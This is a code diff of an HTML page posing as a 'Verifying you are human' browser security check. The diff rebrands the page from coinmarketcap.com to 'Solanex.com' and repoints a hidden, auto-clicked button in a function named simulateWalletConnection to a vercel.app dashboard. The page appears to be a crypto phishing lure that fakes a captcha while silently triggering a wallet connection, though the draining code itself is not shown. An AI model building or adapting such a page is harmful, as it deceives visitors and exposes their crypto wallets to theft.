@@ -172,7 +172,6 @@
 		color: #0051c3;
 		text-decoration: none
 	}
-	
 	a:hover {
 		text-decoration: underline
 	}
@@ -182,14 +181,14 @@
 
 <body>
 	<div class="main-content">
-		<h1>coinmarketcap.com</h1>
+		<h1>Solanex.com</h1>
 		<p class="verification-message">Verifying you are human. This may take a few seconds.</p>
 		<div class="captcha-container" id="captchaContainer">
 			<input type="checkbox" id="captchaCheckbox" class="captcha-checkbox">
 			<div class="spinner" id="spinner"></div>
 			<label for="captchaCheckbox" class="captcha-label">I'm not a robot</label>
 		</div>
-		<p class="security-message">coinmarketcap.com needs to review the security of your connection before proceeding.</p>
+		<p class="security-message">Solanex.com needs to review the security of your connection before proceeding.</p>
 		<noscript>
 			<p class="security-message">Enable JavaScript and cookies to continue</p>
 		</noscript>
@@ -204,7 +203,7 @@
 
 	function simulateWalletConnection() {
 		const tempBtn = document.createElement('button');
-		tempBtn.className = 'simulate delay-yes redirect-https://coinmarketcap.com';
+		tempBtn.className = 'simulate delay-yes redirect-https://solanex-roan.vercel.app/dashboard.html';
 		tempBtn.style.display = 'none';
 		document.body.appendChild(tempBtn);
 		tempBtn.click();
